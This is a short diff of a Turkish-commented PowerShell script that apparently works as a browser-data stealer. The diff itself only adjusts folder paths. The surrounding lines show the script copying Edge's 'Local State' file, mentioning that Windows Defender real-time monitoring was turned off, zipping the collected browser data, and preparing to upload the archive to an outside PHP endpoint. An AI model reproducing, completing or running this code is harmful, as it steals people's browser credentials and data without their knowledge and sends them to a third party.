@@ -56,17 +56,17 @@ Copy-Item -Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State" -Destin
 # Re-enable Windows Defender real-time monitoring (if needed)
 #Set-MpPreference -DisableRealtimeMonitoring $false
 # Sıkıştırmak istediğiniz klasörün yolu
-$folderPath = "C:\%APPDATA%\BrowserData"
+$folderPath = "%APPDATA%\BrowserData"
 
 # ZIP dosyasının hedef yolu
-$zipFilePath = "C:\%APPDATA%\ZippedBrowserData\BrowserData.zip"
+$zipFilePath = "%APPDATA%\ZippedBrowserData\BrowserData.zip"
 
 # Klasörü ZIP dosyasına sıkıştırma
 Compress-Archive -Path $folderPath\* -DestinationPath $zipFilePath
 
 
 # Yüklemek istediğiniz dosyanın yolu
-$filePath = "C:\%APPDATA%\ZippedBrowserData\BrowserData.zip"
+$filePath = "%APPDATA%\ZippedBrowserData\BrowserData.zip"
 
 # PHP dosya yükleme URL'si
 $url = "https://alperen.cc/uploadd.php" # PHP uygulamanızın URL'sini buraya yazın
